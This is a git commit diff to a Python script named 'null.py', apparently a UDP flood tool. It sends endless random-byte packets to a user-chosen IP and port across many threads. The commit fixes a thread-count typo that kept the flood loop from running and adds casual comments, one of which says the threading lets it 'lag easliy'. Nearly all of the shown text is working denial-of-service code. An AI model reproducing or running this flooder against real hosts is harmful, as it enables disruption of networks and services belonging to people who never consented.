19748435adf90c6b6d5f4c11cdf242bf7c874811
ZeroTwoModz <70921101+ZeroTwoModz@users.noreply.github.com>
2021-08-27 11:34:45 +0400

    fixed bug & added comments

--- null.py
+++ null.py
@@ -8,7 +8,7 @@ import os
 def start(ip, port, size, index):
     data = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)         
     while True:
-        data.sendto(random._urandom(size), (ip, port))
+        data.sendto(random._urandom(size), (ip, port)) # Welp it just sends sockets ig
         print(f"|| You've sent {size} bytes to {ip}")
         
         
@@ -30,27 +30,27 @@ def main():
         threads= int(input("Threads? (1000) \n")) if len(sys.argv) < 5 else int(sys.argv[4])
 
         if port > 65535 or port < 1:
-            print("\n<<ERROR>> Port should be between 1, 65535")
+            print("\n<<ERROR>> Port should be between 1, 65535") # min port is 1 and max port is 65535 so here we prevent people from typing something like 8000000000
             sys.exit(1)
 
         if packet > 65500 or packet < 1:
-            print("\n<<ERROR>> Size should be between 1 and 65500")
+            print("\n<<ERROR>> Size should be between 1 and 65500") # yeah no
             sys.exit(1)
 
     except KeyboardInterrupt:
-        print("\nSee you soon :)")
+        print("\nSee you soon :)") # if someone does ctrl + c / ctrl + z it will print this message
         sys.exit()
     
     except Exception as e:
-        print(f"\n<<ERROR>> {e}")
+        print(f"\n<<ERROR>> {e}") # well this is kinda useless but if error came out this will print it
         sys.exit()
 
-    for i in range(thread):
+    for i in range(threads): # oops missed typo
         try:
-            t = threading.Thread(target=start, args=(target, port, packet, i))
+            t = threading.Thread(target=start, args=(target, port, packet, i)) # i used threading so it can become more powerful and lag easliy
             t.start()
         except Exception as e:
-            print(f"\n<<ERROR>> An error ocurred initializing thread {i}: {e}")            
+            print(f"\n<<ERROR>> An error ocurred initializing thread {i}: {e}")  # self explanatory      
 
 if __name__ == "__main__":
     main()
